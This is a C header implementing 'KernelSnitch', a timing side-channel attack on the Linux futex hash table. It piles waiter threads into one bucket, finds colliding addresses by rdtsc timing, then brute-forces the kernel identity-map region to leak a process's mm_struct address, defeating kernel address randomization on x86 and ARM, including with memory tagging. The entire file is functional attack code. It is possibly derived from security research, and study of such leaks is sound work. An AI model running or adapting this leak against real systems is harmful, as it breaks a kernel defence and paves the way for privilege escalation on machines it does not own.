#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
#define __INTEL
#endif

#define FUTEX_SZ (1ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#define APPENDED_FUTEXES 4096
#define MULITPLE 4
#if defined(__INTEL) || defined(__AMD)
#define IDENTITY_START 0xffff888000000000ULL
#define IDENTITY_END   0xffffc88000000000ULL
#define COARSE_SZ (1ULL << 30)
#elif defined(__ARM)
#define VA_BITS 39
#if VA_BITS==39
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
// #define IDENTITY_END   0xffffffc000000000ULL
#elif VA_BITS==48
#define IDENTITY_START 0xffff000000000000ULL
#define IDENTITY_END   0xffff800000000000ULL
#else
#error "Unsupported VA_BITS (expected 39 or 48)"
#endif
#define COARSE_SZ (1ULL << 30)
#endif

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};
char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
    "not initialized",
    "initialized",
    "collisions found",
    "mm_struct found",
    "mm_struct not found",
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;
    volatile size_t identity_start; /* runtime-clamped scan window start */
    volatile size_t identity_end;   /* runtime-clamped scan window end */
    volatile size_t ram_bytes;      /* detected MemTotal, for post-validation */

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *candidate_addrs;
    volatile size_t candidate_count;
    volatile size_t candidate_max;
    volatile size_t *times;
    volatile size_t *t_before;
    volatile size_t *times2;
    volatile size_t *t_before2;
    volatile size_t *candidate1_idx;
    volatile size_t *candidate2_idx;
    volatile size_t *accepted_idx;
    volatile size_t candidate1_count;
    volatile size_t candidate2_count;
    volatile size_t accepted_count;
    volatile size_t pile2_anchor;
    volatile size_t pile2_anchor_id;
    volatile size_t found;
    volatile size_t mm_struct;
    volatile size_t dbg_any_match; /* diagnostic: candidates where >=2 addrs share a bucket */

    pthread_t *tids;
    size_t identity_diff;

    enum kernelsnitch_state state;

    int mte_enabled;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    unsigned int *uaddr;
    int futex_op;
    unsigned int val3;
    size_t core;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t core = inc_arg->core;
    /* pin this piled waiter away from the measuring core to avoid preempting it */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
    SYSCHK(__futex(inc_arg->uaddr, inc_arg->futex_op, 0, NULL, NULL,
                   inc_arg->val3));
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static int __increase_addr(struct kernelsnitch_shared_state *ks, unsigned int *uaddr,
                           size_t amount, int futex_op, unsigned int val3)
{
    pthread_t tid;
    size_t ncpus = (size_t)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus < 2) ncpus = 2;
    if (!uaddr || (((size_t)uaddr % sizeof(unsigned int)) != 0)) {
        errno = EINVAL;
        return -1;
    }
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        if (!inc_arg) {
            errno = ENOMEM;
            return -1;
        }
        inc_arg->uaddr = uaddr;
        inc_arg->ks = ks;
        inc_arg->futex_op = futex_op;
        inc_arg->val3 = val3;
        inc_arg->core = 1 + (i % (ncpus - 1));  /* cores 1..N-1, keep core 0 for the measurer */
        SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
    }
    WAIT();
    return 0;
}

static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    (void)__increase_addr(ks, (unsigned int *)&ks->inc_futex[id], amount,
                          FUTEX_WAIT_PRIVATE, 0);
}

/**
 * Simple compare
 */
#define REPEAT_MEASUREMENT 128
#define AVERAGE (1<<3)
static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
    for (size_t l = 0; l < AVERAGE; ++l)
        time += __times[l];
    time /= AVERAGE;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    extern int ks_pc_abort_check(uintptr_t *out) __attribute__((weak));
    uintptr_t pc_mm = 0;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    size_t scan_progress = 0;
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        {
            size_t coarse_end = coarse_addr + COARSE_SZ;
            if (ks_pc_abort_check && ks_pc_abort_check(&pc_mm)) {
                ks->mm_struct = (size_t)pc_mm;
                ks->found = 1;
                break;
            }
            if (ks->verbose && ((++scan_progress % 4) == 0))
                pr_info("KS_SCAN_PROGRESS id=%zu coarse=%016zx end=%016zx\n",
                        range->id, coarse_addr, coarse_end);
            if (coarse_end > range->end) coarse_end = range->end;
            for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
                size_t slab_end = slab_addr + mm_slab_sz;
                if (slab_end > coarse_end) slab_end = coarse_end;
                for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {

                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate
                    size_t need = ks->collisions - 1;
                    size_t agree = 0;
                    for (size_t i = 1; i < ks->collisions; ++i)
                        if (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate))
                            agree++;
                    if (agree >= 1)
                        ks->dbg_any_match++;
                    found_hash = (agree >= need);
                    if (found_hash) {
                        ks->mm_struct = mm_struct_candidate;
                        if (ks->verbose)
                        pr_info("CANDIDATE mm=%016zx need=%zu\n",
                                mm_struct_candidate, need);
                        ks->found = 1;
                        break;
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            ks->mm_struct = __mm_struct_candidate;
                            ks->found = 1;
                            break;
                        }
                    }
                }
            }
            }
        }
    }
    free(mm_leak_arg);
    return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->mm_struct = -1;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;
    ks->identity_start = IDENTITY_START;
    ks->identity_end = IDENTITY_END;
    ks->ram_bytes = 0;
    ks->dbg_any_match = 0;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->t_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_max = 4096;
    ks->candidate_count = 0;
    ks->candidate_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->times2 = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->t_before2 = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate1_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate2_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->accepted_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate1_count = 0;
    ks->candidate2_count = 0;
    ks->accepted_count = 0;
    ks->pile2_anchor = 0;
    ks->pile2_anchor_id = 0;

    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(0);
    futex_init();

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 5
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    size_t anchor_id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions;
    ks->candidate1_count = 0;
    ks->candidate2_count = 0;
    ks->accepted_count = 0;

    /* robust empty-bucket baseline: min over several probes */
    size_t approx_time = __measure((size_t)&ks->futexes[0]);
    for (int probe = 1; probe < 6; probe++) {
        size_t t = __measure((size_t)&ks->futexes[KS_PAGE_SIZE + 8 + probe * 64]);
        if (t < approx_time) approx_time = t;
    }

    /* two-phase measurement: only accept addresses whose wake time grows
     * significantly once OUR bucket is piled - this isolates true same-bucket
     * colliders from system-noise/contended-bucket false positives */
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
    ks->t_before[0] = __measure((size_t)&ks->inc_futex[ID]);

    /* phase 1: pre-pile wake times */
    size_t total = ks->total_futexes;
    size_t *t_before = calloc(total, sizeof(size_t));
    for (size_t i = 2; i < total; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        t_before[i] = __measure((size_t)&ks->futexes[id]);
        ks->t_before[i] = t_before[i];
    }

    /* pile the bucket */
    __increase(ks, ID, APPENDED_FUTEXES);
    if (ks->verbose) pr_info("start finding collisisons\n");
    ks->times[0] = __measure((size_t)&ks->inc_futex[ID]);

    size_t threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
    if (ks->verbose) pr_info("collision threshold approx=%zu thr=%zu\n",
                             approx_time, threshold);
    /* phase 2: post-pile; require both slow AND grown vs pre-pile */
    for (size_t i = 2; i < total; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times[i] = __measure(futex_addr);
        if (ks->times[i] > threshold &&
            ks->times[i] > t_before[i] * 3) {
            if (ks->candidate1_count < ks->candidate_max) {
                /* candidate indices are futex byte offsets, not loop counters */
                ks->candidate1_idx[ks->candidate1_count++] = id;
            }
            if (ks->verbose) pr_info("  %016zx (before=%zu after=%zu)\n",
                                     futex_addr, t_before[i],
                                     (size_t)ks->times[i]);
        }
    }
    free(t_before);
    /* wake/clear the piled bucket so the next retry's two-phase measurement
     * starts from a clean (unpiled) baseline */
    __futex((unsigned int *)&ks->inc_futex[ID], FUTEX_WAKE_PRIVATE,
            APPENDED_FUTEXES + 16, NULL, NULL, 0);

    if (ks->candidate1_count == 0) {
        pr_warning("first pile found no candidates -> cannot continue\n");
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }

    /* Cross-validate the timing-pile result with a second independent pile.
     * The second anchor is a first-pile candidate: if it is a true collider,
     * both piles exercise the same kernel hash bucket.  Only addresses seen in
     * both candidate sets are accepted; the two anchors are also retained. */
    anchor_id = 0;
    for (size_t a = 0; a < ks->candidate1_count; ++a) {
        size_t candidate = (size_t)ks->candidate1_idx[a];
        volatile unsigned int *anchor_word;

        if (candidate >= FUTEX_SZ)
            continue;
        anchor_word = (volatile unsigned int *)&ks->futexes[candidate];
        if ((((size_t)anchor_word) % sizeof(unsigned int)) != 0)
            continue;

        /* A plain WAIT only reports EAGAIN for a value mismatch, but keep
         * the second pile's precondition explicit and deterministic. */
        if (*anchor_word != 0)
            *anchor_word = 0;
        anchor_id = candidate;
        break;
    }
    if (anchor_id == 0) {
        pr_warning("first pile had no valid aligned anchor -> cannot continue\n");
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }
    ks->pile2_anchor_id = anchor_id;
    ks->pile2_anchor = (size_t)&ks->futexes[anchor_id];
    if (ks->verbose)
        pr_info("pile2 anchor id=%zu addr=%016zx align=%u value=%u\n",
                anchor_id, (size_t)ks->pile2_anchor,
                (unsigned int)((size_t)ks->pile2_anchor % sizeof(unsigned int)),
                *(volatile unsigned int *)ks->pile2_anchor);
    usleep(2000);

    for (size_t i = 2; i < total; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        ks->t_before2[i] = __measure((size_t)&ks->futexes[id]);
    }
    if (__increase_addr(ks, (unsigned int *)ks->pile2_anchor, APPENDED_FUTEXES,
                        FUTEX_WAIT_PRIVATE, 0) != 0) {
        pr_warning("second pile preconditions failed -> cannot continue\n");
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }
    if (ks->verbose) pr_info("start second pile id=%zu addr=%016zx\n",
                             anchor_id, (size_t)ks->pile2_anchor);
    for (size_t i = 2; i < total; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times2[i] = __measure(futex_addr);
        if (ks->times2[i] > threshold &&
            ks->times2[i] > ks->t_before2[i] * 3) {
            if (ks->candidate2_count < ks->candidate_max) {
                ks->candidate2_idx[ks->candidate2_count++] = id;
            }
            if (ks->verbose) pr_info("  pile2 %016zx (before=%zu after=%zu)\n",
                                     futex_addr, (size_t)ks->t_before2[i],
                                     (size_t)ks->times2[i]);
        }
    }
    __futex((unsigned int *)ks->pile2_anchor, FUTEX_WAKE_PRIVATE,
            APPENDED_FUTEXES + 16, NULL, NULL, 0);

    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    ks->futex_addrs[1] = ks->pile2_anchor;
    ks->accepted_idx[0] = (size_t)-1;
    ks->accepted_idx[1] = anchor_id;
    ks->accepted_count = 2;
    count = 2;
    for (size_t a = 0; a < ks->candidate1_count && count < wanted; ++a) {
        size_t i = (size_t)ks->candidate1_idx[a];
        int in_second = 0;
        for (size_t b = 0; b < ks->candidate2_count; ++b) {
            if ((size_t)ks->candidate2_idx[b] == i) {
                in_second = 1;
                break;
            }
        }
        if (!in_second || i == anchor_id)
            continue;
        ks->futex_addrs[count++] = (size_t)&ks->futexes[i];
        ks->accepted_idx[count - 1] = i;
        ks->accepted_count++;
    }

    if (wanted == count) {
        if (ks->verbose) pr_info("found %zd accepted collisions (pile1=%zu pile2=%zu)\n",
                                 count, (size_t)ks->candidate1_count,
                                 (size_t)ks->candidate2_count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd accepted collisions -> cannot continue (pile1=%zu pile2=%zu)\n",
                   count, (size_t)ks->candidate1_count,
                   (size_t)ks->candidate2_count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
}
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

    size_t span = (ks->identity_end - ks->identity_start) / ks->thread_cnt;
    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
        mm_leak_arg->range.start = ks->identity_start + span*i;
        mm_leak_arg->range.end = ks->identity_start + span*(i+1);
        if (mm_leak_arg->range.end > ks->identity_end) {
            mm_leak_arg->range.end = ks->identity_end;
        }
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i)
        pthread_join(ks->tids[i], 0);
    if (ks->verbose)
        pr_info("bruteforce dbg_any_match=%zu (candidates where >=2 addrs shared bucket)\n", ks->dbg_any_match);
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->t_before, sizeof(size_t)*ks->total_futexes);
    ks->t_before = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->candidate_addrs, sizeof(size_t)*ks->candidate_max);
    ks->candidate_addrs = 0;
    munmap((void *)ks->times2, sizeof(size_t)*ks->total_futexes);
    ks->times2 = 0;
    munmap((void *)ks->t_before2, sizeof(size_t)*ks->total_futexes);
    ks->t_before2 = 0;
    munmap((void *)ks->candidate1_idx, sizeof(size_t)*ks->candidate_max);
    ks->candidate1_idx = 0;
    munmap((void *)ks->candidate2_idx, sizeof(size_t)*ks->candidate_max);
    ks->candidate2_idx = 0;
    munmap((void *)ks->accepted_idx, sizeof(size_t)*(ks->collisions + 1));
    ks->accepted_idx = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}

/**
 * Performs KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_find_collisions(ks);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_bruteforce(ks);
    if (ks->verbose) pr_info("===============================================\n");
    return kernelsnitch_cleanup(ks);
}

/**
 * Prints the current execution state KernelSnitch is in
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
{
    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
}

/**
 * Prints the found collisions
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
{
    pr_info("collisions:\n");
    for (size_t i = 0; i < ks->accepted_count; ++i) {
        size_t addr = ks->futex_addrs[i];
        pr_info("  %016zx\n", addr);
    }
}

/**
 * KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @return: the found mm_struct address
 */
size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
{
    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0, 0);
}
